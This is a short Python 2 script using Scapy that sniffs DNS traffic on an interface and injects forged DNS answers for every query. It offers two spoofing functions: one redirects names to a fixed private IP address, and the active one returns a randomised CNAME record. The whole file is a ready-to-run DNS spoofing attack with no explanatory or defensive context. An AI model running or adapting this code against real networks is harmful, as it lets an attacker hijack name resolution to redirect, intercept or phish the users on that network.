from scapy.all import *
import uuid

def dns_spoof1(pkt):
    redirect_to = '172.16.1.63'
    if pkt.haslayer(DNSQR): # DNS question record
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=0, rdata=redirect_to))
        send(spoofed_pkt)
        print 'Sent:', spoofed_pkt.summary()

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR): # DNS question record
    	redirect_to = str(uuid.uuid4().get_hex().upper()[0:20])+"."+pkt[DNS].qd.qname
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=redirect_to))
        send(spoofed_pkt, verbose=0)
        #print 'Sent:', spoofed_pkt.summary()

sniff(filter='udp port 53', iface='eth0', store=0, prn=dns_spoof)
